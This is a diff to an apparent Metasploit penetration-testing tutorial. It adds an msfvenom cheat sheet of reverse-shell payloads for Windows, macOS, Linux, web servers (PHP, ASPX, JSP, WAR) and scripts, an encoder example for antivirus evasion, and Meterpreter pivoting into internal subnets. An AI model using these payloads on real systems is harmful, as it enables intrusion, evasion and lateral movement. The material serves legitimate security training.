@@ -242,20 +242,52 @@ Successful credentials appear in the console and a **shell** session is automati
 
 ## 6️⃣ Advanced Techniques  
 
-### 6.1 Generating Custom Payloads with **msfvenom**  
+### 6.1 Generating Custom Payloads with **msfvenom** (Cheat Sheet)
+
+*Staged payloads* (`/`) load a tiny initial shellcode stage that fetches the rest of Meterpreter over the network.  
+*Unstaged payloads* (`_`) package the complete Meterpreter binary inside the file (more reliable over shaky connections).
 
 ```bash
-# Windows x64 EXE
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o ~/Desktop/win_rev.exe
+# 1. Windows x64 Executable (Unstaged - recommended for modern targets)
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o ~/Desktop/win64_rev.exe
 
-# macOS ARM64 Mach‑O (native for Apple Silicon)
-msfvenom -p osx/arm64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4455 -f macho -o ~/Desktop/mac_rev.macho
+# 2. macOS ARM64 Mach‑O (Native Apple Silicon binary)
+msfvenom -p osx/arm64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4455 -f macho -o ~/Desktop/mac_arm64_rev.macho
 
-# Linux ARM (e.g., Raspberry Pi)
-msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4466 -f elf -o /tmp/arm_rev.elf
+# 3. Linux x64 ELF Binary
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4466 -f elf -o /tmp/linux64_rev.elf
+
+# 4. Web Application Payloads (PHP, ASPX, JSP, Apache Tomcat WAR)
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o shell.php
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f aspx -o shell.aspx
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war
+
+# 5. One-Liner Script Payloads (Python & PowerShell)
+msfvenom -p python/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o shell.py
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f ps1 -o shell.ps1
+
+# 6. Encoder & Bad Character Evasion Example
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -e x86/shikata_ga_nai -i 5 -b '\x00\x0a\x0d' -f exe -o evasion.exe
 ```
 
-You can add an encoder (`-e x86/shikata_ga_nai`) or exclude bad characters (`-b '\x00'`). Full list of options lives in the msfvenom docs【6†L6-L13】.
+### 6.1.1 Network Pivoting & Port Forwarding with Meterpreter
+Pivot into internal networks reachable only by your target machine:
+
+```bash
+# Inside Meterpreter session (e.g. Session 1):
+# 1. Forward remote internal port 80 (e.g., 10.0.0.5:80) to local port 8080 on your Mac
+meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.5
+# Now visit http://localhost:8080 in your browser to access 10.0.0.5:80!
+
+# 2. Add an automatic route through Meterpreter for the internal subnet (10.0.0.0/24)
+meterpreter > run post/multi/manage/autoroute
+# Or inside msfconsole:
+msf > use post/multi/manage/autoroute
+msf post(autoroute) > set SESSION 1
+msf post(autoroute) > set SUBNET 10.0.0.0/24
+msf post(autoroute) > run
+```
 
 ### 6.2 Persistence on macOS (LaunchAgent)  
 
